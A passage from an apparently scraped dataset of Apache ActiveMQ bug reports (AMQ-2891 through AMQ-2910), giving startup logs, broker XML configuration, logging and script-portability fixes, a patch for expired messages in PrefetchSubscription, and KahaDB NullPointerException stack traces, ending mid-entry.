texts:backoffMultipler getter/setter should be same type to honor getter/setter contract
See AMQ-910 which causes this issue.And as reported herehttp://fusesource.com/forums/thread.jspa?threadID=2198&tstart=0The proposed patch is to change the getter to be the same type as the setter.
issueID:AMQ-2891
type:Bug
changed files:Queue.java
texts:ActiveMQ takes longer to start with KahaDb and more than 10000 messages
ActiveMQ takes around five minutes to start with KahaDb with more than 10000 messages. All messages are persistent queue. With 500,000 persistent messsages, ittook around 20 minutes to start.See the five minutes time difference between lines:2010-08-31 12:55:19,286 | INFO | PListStore:C:ActiveMQapache-activemq-5.4.0inwin32....datalocalhost	mp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain2010-08-31 13:03:56,983 | INFO | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMainFrom activemq.log with 100,000 messages2010-08-31 12:55:10,436 | INFO | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector2010-08-31 12:55:11,294 | INFO | KahaDB is version 2 | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 12:55:11,435 | INFO | Recovering from the journal ... | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 12:55:11,435 | INFO | Recovery replayed 1 operations from the journal in 0.063 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 12:55:12,090 | INFO | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 12:55:12,090 | INFO | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 12:55:12,278 | INFO | Scheduler using directory: activemq-datascheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | WrapperSimpleAppMain2010-08-31 12:55:19,286 | INFO | PListStore:C:ActiveMQapache-activemq-5.4.0inwin32....datalocalhost	mp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain2010-08-31 13:03:56,983 | INFO | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMain2010-08-31 13:03:56,999 | INFO | Connector nio Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain2010-08-31 13:03:57,045 | INFO | ActiveMQ JMS Message Broker (localhost, ID:S90356004630988-3777-1283273712137-0:0) started | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 13:03:57,639 | INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:03:57,639 | INFO | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:03:58,451 | INFO | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | WrapperSimpleAppMain2010-08-31 13:03:58,857 | INFO | Initializing Spring FrameworkServlet "dispatcher" | /admin | WrapperSimpleAppMain2010-08-31 13:03:59,341 | INFO | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:04:00,091 | INFO | Initializing Spring root WebApplicationContext | /camel | WrapperSimpleAppMain2010-08-31 13:04:02,668 | INFO | Connector vm://localhost Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain2010-08-31 13:04:04,526 | INFO | Camel Console at http://0.0.0.0:8161/camel | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:04:04,589 | INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:04:04,651 | INFO | RESTful file access application at http://0.0.0.0:8161/fileserver | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 13:04:04,698 | INFO | Started SelectChannelConnector@0.0.0.0:8161 | org.eclipse.jetty.util.log | WrapperSimpleAppMain2With 500,000 messages, AMQ took 20 minutes to start.2010-08-31 15:24:31,178 | INFO  | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector2010-08-31 15:24:31,975 | INFO  | KahaDB is version 2 | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 15:24:32,194 | INFO  | Recovering from the journal ... | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 15:24:32,194 | INFO  | Recovery replayed 1 operations from the journal in 0.047 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain2010-08-31 15:24:35,365 | INFO  | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 15:24:35,365 | INFO  | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 15:24:35,552 | INFO  | Scheduler using directory: activemq-datascheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | WrapperSimpleAppMain2010-08-31 15:24:48,034 | INFO  | PListStore:C:ActiveMQapache-activemq-5.4.0inwin32....datalocalhost	mp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain2010-08-31 15:45:09,767 | INFO  | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMain2010-08-31 15:45:09,767 | INFO  | Connector nio Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain2010-08-31 15:45:09,876 | INFO  | ActiveMQ JMS Message Broker (localhost, ID:S90356004630988-3029-1283282675427-0:0) started | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain2010-08-31 15:45:10,923 | INFO  | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:10,923 | INFO  | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:10,970 | INFO  | Slow KahaDB access: cleanup took 1047 | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker2010-08-31 15:45:11,829 | INFO  | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | WrapperSimpleAppMain2010-08-31 15:45:12,235 | INFO  | Initializing Spring FrameworkServlet "dispatcher" | /admin | WrapperSimpleAppMain2010-08-31 15:45:12,719 | INFO  | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:13,422 | INFO  | Initializing Spring root WebApplicationContext | /camel | WrapperSimpleAppMain2010-08-31 15:45:16,390 | INFO  | Connector vm://localhost Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain2010-08-31 15:45:18,468 | INFO  | Camel Console at http://0.0.0.0:8161/camel | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:18,561 | INFO  | ActiveMQ Web Demos at http://0.0.0.0:8161/demo | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:18,624 | INFO  | RESTful file access application at http://0.0.0.0:8161/fileserver | org.eclipse.jetty.util.log | WrapperSimpleAppMain2010-08-31 15:45:18,686 | INFO  | Started SelectChannelConnector@0.0.0.0:8161 | org.eclipse.jetty.util.log | WrapperSimpleAppMainHere is the config:    <broker xmlns="http://activemq.apache.org/schema/core" brokerName="localhost" dataDirectory="${activemq.base}/data" persistent="true" systemExitOnShutdown="true" useShutdownHook="false" advisorySupport="false" useJmx="true">        <!--   For better performances use VM cursor and small memory limit.   For more information, see:            http://activemq.apache.org/message-cursors.html            Also, if your producer is "hanging", it"s probably due to producer flow control.            For more information, see:            http://activemq.apache.org/producer-flow-control.html        -->        <destinationPolicy>            <policyMap>              <policyEntries>                <policyEntry topic=">" producerFlowControl="false" optimizedDispatch="true" memoryLimit="128mb">                  <pendingSubscriberPolicy>                    <fileCursor />                  </pendingSubscriberPolicy>                </policyEntry>                <policyEntry queue=">" producerFlowControl="false" optimizedDispatch="true" memoryLimit="128mb">                  <!-- Use VM cursor for better latency                       For more information, see:                       http://activemq.apache.org/message-cursors.html                   -->                      <pendingQueuePolicy>                    <fileQueueCursor/>                  </pendingQueuePolicy>                </policyEntry>              </policyEntries>            </policyMap>        </destinationPolicy>         <!--             The managementContext is used to configure how ActiveMQ is exposed in             JMX. By default, ActiveMQ uses the MBean server that is started by             the JVM. For more information, see:             http://activemq.apache.org/jmx.html         -->        <managementContext>            <managementContext createConnector="true"/>        </managementContext>        <!--             Configure message persistence for the broker. The default persistence            mechanism is the KahaDB store (identified by the kahaDB tag).             For more information, see:             http://activemq.apache.org/persistence.html         -->        <persistenceAdapter>            <kahaDB directory="${activemq.base}/data/kahadb" enableIndexWriteAsync="true" journalMaxFileLength="64mb"  indexWriteBatchSize="10000" indexCacheSize="10000"/>        </persistenceAdapter>          <!--            The systemUsage controls the maximum amount of space the broker will             use before slowing down producers. For more information, see:            http://activemq.apache.org/producer-flow-control.html        <systemUsage>            <systemUsage>                <memoryUsage>                    <memoryUsage limit="600 mb"/>                </memoryUsage>                <storeUsage>                    <storeUsage limit="10 gb"/>                </storeUsage>                <tempUsage>                    <tempUsage limit="1 gb"/>                </tempUsage>            </systemUsage>        </systemUsage>  -->        <!--             The transport connectors expose ActiveMQ over a given protocol to            clients and other brokers. For more information, see:             http://activemq.apache.org/configuring-transports.html         -->        <transportConnectors>            <transportConnector name="nio" uri="nio://0.0.0.0:61616"/>        </transportConnectors>    </broker>
issueID:AMQ-2892
type:Bug
changed files:ServerSessionImpl.java
texts:ServerSessionImpl in module ra does not report exception with stacktrace
The ServerSessionImpl code does not report errors correctly (i.e. never shows the stacktrace):in the run() method, the catch is like this:ServerSessionImpl.java            } catch (Throwable e) {                stale = true;                if ( log.isInfoEnabled() ) {                    log.info("Endpoint failed to process message. Reason: " + e.getMessage());                                    } else if ( log.isDebugEnabled() ) {      log.debug("Endpoint failed to process message.", e);                }but this means that you will never see the actual exception...(since if DEBUG is enabled, INFO would usually always be, therefore only the log.info is only called and this does not provide the stacktrace...) the code would be better like this:ServerSessionImpl.java            } catch (Throwable e) {                stale = true;                if ( log.isDebugEnabled() ) {      log.debug("Endpoint failed to process message.", e);                } else if ( log.isInfoEnabled() ) {                    log.info("Endpoint failed to process message. Reason: " + e.getMessage());                                    }
issueID:AMQ-2895
type:Bug
changed files:
texts:Updating broker-config.xml for rar deployer
The default broker-config.xml file is no more valid since xml schema validation introduced into 5.4.0 release.Please find attached the corrected version. Also the default persistence manager was updated to KahaDB (is the default since 5.3 release).
issueID:AMQ-2896
type:Bug
changed files:
texts:Can&#39;t use maven-eclipse-plugin on trunk
When I run mvn eclipse:eclipse, I get the following error:Caused by: org.apache.maven.artifact.resolver.ArtifactResolutionException: Failed to resolve artifact, possibly due to a repository list that is not appropriately equipped for this artifact"s metadata.  org.apache.maven.plugins:maven-eclipse-plugin:pom:2.8-SNAPSHOTfrom the specified remote repositories:  apache.snapshots (https://repository.apache.org/content/repositories/snapshots/),  central (http://repo1.maven.org/maven2) at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:221) at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:90) at org.apache.maven.project.DefaultMavenProjectBuilder.findModelFromRepository(DefaultMavenProjectBuilder.java:558) ... 24 moreFixing this shortly...
issueID:AMQ-2897
type:Bug
changed files:BrokerService.java
texts:JobSchedulerStore is not started unless a message requesting delayed delivery is added to the queue or a job list request is done in the admin console
Problem: Job scheduler does not get started after broker restart.1) Fire up the broker (using default config (bin/activemq console)2) Start the client app (I"m using Mule)3) Post a message to the queue with AMQ_SCHEDULED_DELAY set to some value (10000ms)4) Shut down the broker5) Fire up the broker againExpected behavior: The broker would start the job scheduler and fire off the job waitingActual behavior: The job scheduler starts when 1) a new message is posted to the queue with the AMQ_SCHEDULED_DELAY set2) I click on the "Scheduled" link in the admin ui
issueID:AMQ-2898
type:Bug
changed files:
texts:grep option is not POSIX compliant
in the bin/activemq script use of -q option on standard grep is not working :$./activemq statusgrep: illegal option &#8211; qUsage: grep -hblcnsviw pattern file . . .ERROR: There are syntax errors in "/etc/default/activemq"after changing script to use ggrep which is the GNU grep in Solaris script no longer reported this issuethere can be 2 solutions:use of POSIX compliant grep options ordetection of grep version and trying to use ggrep
issueID:AMQ-2899
type:Bug
changed files:
texts:whoami not in PATH on Solaris
bin/activemq script has reference to missing commandStandard PATH for Solaris is /bin:/usr/bin and these folders do not contain "whoami" this is located in /usr/ucb/bin which is rarely set in PATH I recommend use of $LOGNAME instead or detection of whoami location
issueID:AMQ-2900
type:Bug
changed files:ActiveMQComponent.java
JournalComponent.java
texts:java doc of activemq-camel component need to be updated
"http;//activem.apache.org/camel"  need to be changed to "http://camel.apache.org"and the java doc of JournalComponent.java is wrong.
issueID:AMQ-2902
type:Bug
changed files:
texts:ResourceAdapter logs confusing Exception upon pool connection disposal
After upgrading to 5.4.0 we see many exceptions of the following kind being logged with level INFO:2010-09-07 13:23:25,824 INFO  &#91;org.apache.activemq.broker.TransportConnection.Transport&#93; Transport failed: org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://caa.embedded?waitForStart=300000&async=false#13) disposed.org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://caa.embedded?waitForStart=300000&async=false#13) disposed. at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:159) at org.apache.activemq.transport.vm.VMTransportServer$1.stop(VMTransportServer.java:81) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43) at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:656) at org.apache.activemq.ra.ActiveMQManagedConnection.destroy(ActiveMQManagedConnection.java:207) at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.doDestroy(InternalManagedConnectionPool.java:650) at org.jboss.resource.connectionmanager.InternalManagedConnectionPool.removeTimedOut(InternalManagedConnectionPool.java:481) at org.jboss.resource.connectionmanager.IdleRemover$IdleRemoverRunnable.run(IdleRemover.java:164) at java.lang.Thread.run(Thread.java:619)I suppose that the cause for the message is actually harmless - hence the INFO level - but the messages are confusing and annoying nonetheless.
issueID:AMQ-2904
type:Bug
changed files:
texts:failover: protocol doesn&#39;t work within a static:() URI in a networkConnector
Am configuring a networkConnector, and want it to do failover against two brokers. Xml config snippit:<networkConnectors>            <networkConnector  uri="static:(failover:(tcp://${activemq01.master.networkconnector.ip}:${activemq01.master.openwire.port},tcp://${activemq01.slave.networkconnector.ip}:${activemq01.slave.openwire.port})?randomize=true)"                duplex="true"                networkTTL="2"/>        </networkConnectors>Problem is, the failoer doesn"t work When activemq02 connects to activemq01, we see the following on activemq01:INFO | Connector openwire Started INFO | ActiveMQ JMS Message Broker (activemq01, ID:Ade"s-52856-1283520722984-0:0) started INFO | Connector vm://activemq01 Started INFO | Created Duplex Bridge back to activemq02 INFO | Network connection between vm://activemq01#0 and tcp:///127.0.0.1:52864(activemq02) has been established.All good! If I take activemq01 down, then on reconnect, we don"t see the duplex bridge get created. This is the output from activemq01.INFO | Recovery replayed 1 operations from the journal in 0.036 seconds. INFO | ActiveMQ 5.4.0-fuse-00-00 JMS Message Broker (activemq01) is starting INFO | For help or more information please see: http://activemq.apache.org/ INFO | Scheduler using directory: activemq-data/scheduler INFO | Listening for connections at: tcp://0.0.0.0:61626 INFO | Connector openwire Started INFO | ActiveMQ JMS Message Broker (activemq01, ID:Ade"s-52922-1283520881264-0:0) startedNote that there"s no mention of a Duplex bridge. The output from the activemq02 broker says:Transport (/127.0.0.1:61616) failed to tcp://127.0.0.1:61616 , attempting to automatically reconnect due to: java.io.EOFException INFO | Outbound transport to activemq01 interrupted. INFO | Network connection between vm://activemq02#0 and tcp://127.0.0.1:61626(activemq01) has been established. INFO | Outbound transport to activemq01 resumed INFO | Successfully reconnected to tcp://127.0.0.1:61626 WARN | Unexpected extra broker info command received: BrokerInfo {commandId = 19, responseRequired = false, brokerId = ID:Ade"s-52922-1283520881264-0:0, brokerURL = tcp://0.0.0.0:61626, slaveBroker = false, masterBroker = false, faultTolerantConfiguration = false, networkConnection = false, duplexConnection = false, peerBrokerInfos = [], brokerName = activemq01, connectionId = 0, brokerUploadUrl = null, networkProperties = null}
issueID:AMQ-2907
type:New Feature
changed files:
texts:Solaris 10 SMF manifest
Solaris 10 uses SMF to manage services, it is useful to attach service manifest to the distribution for easier deployments
issueID:AMQ-2908
type:Bug
changed files:
texts:Slow consumer stops receiving messages because PrefetchSubscription.dispatched is filled with expired messages.
Slow consumer gets stuck when consuming from queue that has expiring messages in it. Looked into broker while it got stuck and saw that PrefetchSubscription.dispatched is full of expired messages.WORKAROUNDInto doActualDispatch added check that if subscription is full, it will remove all expired message from dispatch.Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java===================================================================--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java               (revision 42304)+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java            (working copy)@@ -400,6 +400,21 @@         }     } +   public void removeExpiredMessagesFromDispatch() {+     synchronized(dispatchLock) {+                  for (Iterator<MessageReference> iter = dispatched.iterator(); iter.hasNext(); ) {+                    final MessageReference node = iter.next();+                    if (node.isExpired()) {+                        if (broker.isExpired(node)) {+                            node.getRegionDestination().messageExpired(context, this, node);+                        }+                        dispatched.remove(node);+                        node.getRegionDestination().getDestinationStatistics().getInflight().decrement();+                    }+                  }+     }+   }+         /**      * Checks an ack versus the contents of the dispatched list.      * Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java===================================================================--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java           (revision 42304)+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java        (working copy)@@ -1543,6 +1543,9 @@                 }                 if (dispatchSelector.canSelect(s, node)) {                     if (!fullConsumers.contains(s)) {+                               if (s.isFull() && s instanceof PrefetchSubscription) {+                                             ((PrefetchSubscription)s).removeExpiredMessagesFromDispatch();+                               }                         if (!s.isFull()) {                             // Dispatch it.                             s.add(node);
issueID:AMQ-2910
type:Bug
changed files:
texts:NullPointerException in kahadb linked list
We got the following NullPointerException in kahadb.13 Sep 2010 05:53:30 (JMS) [] Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 111839609, responseRequired = false, messageId = ID:statler.ndgf.org-42286-1282568899957-0:0:2:1:43748846, originalDestination = null, originalTransactionId = null, producerId = ID:statler.ndgf.org-42286-1282568899957-0:0:2:1, destination = queue://cells.domain.dCacheDomain, transactionId = null, expiration = 0, timestamp = 0, arrival = 0, brokerInTime = 1284350009950, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@1bada5d, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor java.lang.NullPointerException: null        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:231) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at java.lang.Thread.run(Thread.java:619) &#91;na:1.6.0_20&#93;13 Sep 2010 05:53:30 (JMS) [] Async error occurred: java.lang.RuntimeException: java.lang.NullPointerExceptionjava.lang.RuntimeException: java.lang.NullPointerException        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:228) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at java.lang.Thread.run(Thread.java:619) &#91;na:1.6.0_20&#93;Caused by: java.lang.NullPointerException: null        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:231) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        ... 24 common frames omittedLooking at the code, it appears to me that the only way an NPE can be thrown at that place is if list is null. Since the same method however tests for that exact case, I suspect there is unsynchronized concurrent access to the LinkedNode.A few hours later we got more failures:13 Sep 2010 08:38:19 (JMS) [] Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 29114496, responseRequired = false, messageId = ID:arctic01.csc.fi-39780-1280232016428-0:0:2:1:333447, originalDestination = null, 